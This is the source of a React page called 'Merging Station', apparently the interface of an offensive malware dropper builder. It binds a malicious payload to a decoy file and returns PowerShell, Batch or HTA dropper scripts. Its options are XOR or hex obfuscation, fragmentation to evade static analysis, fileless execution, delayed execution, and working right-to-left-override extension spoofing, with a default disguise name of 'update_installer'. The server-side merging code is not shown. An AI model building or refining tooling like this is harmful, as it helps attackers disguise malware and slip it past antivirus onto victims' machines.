
'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { Loader2, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon, Key } from 'lucide-react';
import { Progress } from '@/components/ui/progress';
import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Badge } from '@/components/ui/badge';
import { mergePayloads } from '@/actions/merge-payload-action';
import { Checkbox } from '@/components/ui/checkbox';
import { Separator } from '@/components/ui/separator';

const formSchema = z.object({
  payloadFile: z.any().refine(files => files?.length === 1, "Payload file is required."),
  benignFile: z.any().refine(files => files?.length === 1, "Benign file is required."),
  iconFile: z.any().optional(),
  outputName: z.string().min(1, "Output name is required."),
  outputFormat: z.string(),
  extensionSpoofing: z.boolean().default(false),
  obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
  xorKey: z.string().optional(),
  useFragmentation: z.boolean().default(false),
  executionDelay: z.string().optional(),
  fileless: z.boolean().default(true),
});

const outputFormats = {
    'ps1': { name: 'PowerShell (.ps1)', extension: 'ps1', disabled: false },
    'bat': { name: 'Batch (.bat)', extension: 'bat', disabled: false },
    'hta': { name: 'HTML Application (.hta)', extension: 'hta', disabled: false },
    'js': { name: 'JScript (.js)', extension: 'js', disabled: true },
    'vbs': { name: 'VBScript (.vbs)', extension: 'vbs', disabled: true },
    'exe': { name: 'Windows Executable (.exe)', extension: 'exe', disabled: true },
    'scr': { name: 'Screensaver (.scr)', extension: 'scr', disabled: true },
    'lnk': { name: 'Shortcut (.lnk)', extension: 'lnk', disabled: true },
};

export default function MergingStationPage() {
  const [buildLog, setBuildLog] = useState<string[]>([]);
  const [isBuilding, setIsBuilding] = useState(false);
  const [progress, setProgress] = useState(0);
  const [finalOutput, setFinalOutput] = useState<{name: string, content: string, vtScore: string} | null>(null);
  const { toast } = useToast();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      outputName: 'update_installer',
      outputFormat: 'ps1',
      extensionSpoofing: false,
      obfuscationType: 'none',
      xorKey: 'netrax',
      useFragmentation: false,
      executionDelay: '',
      fileless: true,
    },
  });

  const watchObfuscationType = form.watch('obfuscationType');

 const applyExtensionSpoofing = (filename: string): string => {
    const parts = filename.split('.');
    if (parts.length < 2) return filename; // No extension to spoof
    const realExtension = parts.pop() || '';
    const fakeExtension = parts.pop() || '';
    const nameWithoutExt = parts.join('.');
    
    // RLO character
    return `${nameWithoutExt}.${fakeExtension}\u202E${realExtension.split('').reverse().join('')}.txt`;
 };
 
 const handleFormatChange = (value: string) => {
    const format = outputFormats[value as keyof typeof outputFormats];
    if (format) {
        const currentName = form.getValues('outputName');
        const nameParts = currentName.split('.');
        const baseName = nameParts.length > 1 ? nameParts.slice(0, -1).join('.') : nameParts[0];
        form.setValue('outputName', `${baseName}.${format.extension}`);
    }
    form.setValue('outputFormat', value);
 }

 const runBuildProcess = async (values: z.infer<typeof formSchema>) => {
    setIsBuilding(true);
    setBuildLog([]);
    setProgress(0);
    setFinalOutput(null);

    const log = (message: string) => {
        setBuildLog(prev => [...prev, message]);
        setProgress(prev => Math.min(prev + 15, 100));
    };

    try {
        log(`Build started for ${values.payloadFile[0].name} + ${values.benignFile[0].name}`);

        const payloadFile = values.payloadFile[0] as File;
        const benignFile = values.benignFile[0] as File;

        const payloadContent = await fileToDataUrl(payloadFile);
        const benignContent = await fileToDataUrl(benignFile);
        
        log('Files encoded. Sending to server for merging...');
        
        const response = await mergePayloads({
            payload: { name: payloadFile.name, content: payloadContent },
            benign: { name: benignFile.name, content: benignContent },
            outputFormat: values.outputFormat as any,
            obfuscationType: values.obfuscationType,
            encryptionKey: values.obfuscationType === 'xor' ? values.xorKey : undefined,
            useFragmentation: values.useFragmentation,
            executionDelay: values.executionDelay,
            fileless: values.fileless,
        });
        
        if (!response.success || !response.scriptContent) {
            throw new Error(response.error || 'Failed to generate script on the server.');
        }
        
        log(`Dropper script generated successfully (${values.outputFormat}).`);
        if (values.obfuscationType !== 'none') log(`Payload obfuscated with ${values.obfuscationType.toUpperCase()}`);
        if (values.useFragmentation) log(`Payload split into fragments.`);
        if (values.fileless) log(`Fileless execution enabled.`);
        if (values.executionDelay) log(`Execution delayed by ${values.executionDelay} seconds.`);

        const finalName = values.extensionSpoofing
            ? applyExtensionSpoofing(values.outputName)
            : values.outputName;

        setFinalOutput({ name: finalName, content: response.scriptContent, vtScore: '0/70 (Simulated)' });
        
        log(`Build complete. Output file: ${finalName}`);
        toast({ title: 'Build Successful', description: 'Your dropper script is ready for download.' });

    } catch (e: any) {
      toast({ variant: 'destructive', title: 'Build Failed', description: e.message || 'An unexpected error occurred.' });
      setBuildLog(prev => [...prev, `ERROR: ${e.message}`]);
    } finally {
      setIsBuilding(false);
      setProgress(100);
    }
  };
  
  const fileToDataUrl = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result as string);
        reader.onerror = reject;
        reader.readAsDataURL(file);
    });
  }

  const handleDownload = () => {
    if(!finalOutput) return;
    const blob = new Blob([finalOutput.content], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = finalOutput.name;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Merging Station</h1>
        <p className="text-muted-foreground">Craft sophisticated payloads by binding files, applying evasion techniques, and selecting output formats.</p>
      </div>
      
      <Form {...form}>
        <form onSubmit={form.handleSubmit(runBuildProcess)}>
          <div className="grid lg:grid-cols-3 gap-6 items-start">
            <div className="lg:col-span-2 grid md:grid-cols-2 gap-6">
              <Card>
                <CardHeader><CardTitle className="text-lg">1. Input Files</CardTitle></CardHeader>
                <CardContent className="space-y-4">
                  <FormField control={form.control} name="payloadFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Malicious Payload (.ps1, .bat, etc)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                  <FormField control={form.control} name="benignFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormDescription className="text-xs">Note: Icon injection is only possible for compiled executables. For scripts, this can be used with a .LNK shortcut wrapper.</FormDescription><FormMessage /></FormItem>)} />
                </CardContent>
              </Card>

              <Card>
                <CardHeader><CardTitle className="text-lg">2. Dropper Configuration</CardTitle></CardHeader>
                <CardContent className="space-y-4">
                  <FormField control={form.control} name="outputName" render={({ field }) => ( <FormItem><FormLabel>Output File Name</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem> )}/>
                  <FormField control={form.control} name="outputFormat" render={({ field }) => ( <FormItem><FormLabel>Output Format</FormLabel><Select onValueChange={handleFormatChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{Object.entries(outputFormats).map(([key, value])=><SelectItem key={key} value={key} disabled={value.disabled}>{value.name}</SelectItem>)}</SelectContent></Select></FormItem> )}/>
                  <Separator />
                  <Label>Dropper Behavior</Label>
                   <FormField control={form.control} name="extensionSpoofing" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Extension Spoofing</FormLabel><FormDescription>Use RLO character to mask the true extension.</FormDescription></div></FormItem> )}/>
                   <FormField control={form.control} name="fileless" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Fileless Execution</FormLabel><FormDescription>Run payload in memory instead of writing to disk.</FormDescription></div></FormItem> )}/>
                   <FormField control={form.control} name="executionDelay" render={({ field }) => ( <FormItem><FormLabel>Execution Delay (seconds)</FormLabel><FormControl><Input type="number" placeholder="e.g., 10" {...field} value={field.value ?? ''} /></FormControl></FormItem> )}/>
                </CardContent>
              </Card>
              
               <div className="md:col-span-2">
                 <Card>
                    <CardHeader><CardTitle className="text-lg">3. Crypter / Obfuscation</CardTitle></CardHeader>
                    <CardContent className="space-y-4">
                         <FormField control={form.control} name="obfuscationType" render={({ field }) => (
                            <FormItem className="space-y-3">
                                <FormLabel>Encoding / Encryption</FormLabel>
                                <FormControl>
                                <RadioGroup onValueChange={field.onChange} defaultValue={field.value} className="flex flex-col space-y-1">
                                    <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="none" /></FormControl><FormLabel className="font-normal">None</FormLabel></FormItem>
                                    <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="xor" /></FormControl><FormLabel className="font-normal">XOR Encryption</FormLabel></FormItem>
                                    <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="hex" /></FormControl><FormLabel className="font-normal">Hex Encoding</FormLabel></FormItem>
                                </RadioGroup>
                                </FormControl><FormMessage />
                            </FormItem>
                            )}
                        />
                         {watchObfuscationType === 'xor' && (
                            <FormField control={form.control} name="xorKey" render={({ field }) => ( <FormItem><FormLabel className="flex items-center gap-2"><Key className="h-4 w-4"/>XOR Key</FormLabel><FormControl><Input {...field} value={field.value ?? ''} placeholder="Enter encryption key" /></FormControl><FormMessage /></FormItem> )}/>
                         )}
                         <FormField control={form.control} name="useFragmentation" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Payload Fragmentation</FormLabel><FormDescription>Split the payload into smaller chunks to evade static analysis.</FormDescription></div></FormItem> )}/>
                    </CardContent>
                 </Card>
               </div>

            </div>

            <div className="lg:col-span-1 space-y-6">
                <Button type="submit" className="w-full text-lg py-6" disabled={isBuilding}>
                    {isBuilding ? <Loader2 className="mr-2 h-5 w-5 animate-spin" /> : <Binary className="mr-2 h-5 w-5" />}
                    Build Payload
                </Button>

                <Card>
                    <CardHeader><CardTitle className="text-lg">Build Log</CardTitle></CardHeader>
                    <CardContent>
                        <Progress value={progress} className="mb-2 h-2" />
                        <div className="h-96 bg-primary/10 p-2 rounded-md font-mono text-xs overflow-y-auto">
                          {buildLog.map((log, i) => <p key={i} className="animate-in fade-in">{`> ${log}`}</p>)}
                        </div>
                    </CardContent>
                    {finalOutput && (
                      <CardFooter className="flex-col items-start gap-4 border-t pt-4">
                          <div className="flex justify-between w-full items-center">
                              <p className="font-semibold flex items-center gap-2"><FileCode className="h-4 w-4"/>Output:</p>
                              <p className="font-mono text-xs">{finalOutput.name}</p>
                          </div>
                          <div className="flex justify-between w-full items-center">
                              <p className="font-semibold flex items-center gap-2"><Shield className="h-4 w-4"/>VT Score:</p>
                              <Badge variant="destructive">{finalOutput.vtScore}</Badge>
                          </div>
                          <Button onClick={handleDownload} className="w-full"><Download className="mr-2 h-4 w-4"/>Download Dummy File</Button>
                      </CardFooter>
                    )}
                </Card>
            </div>
          </div>
        </form>
      </Form>
    </div>
  );
}
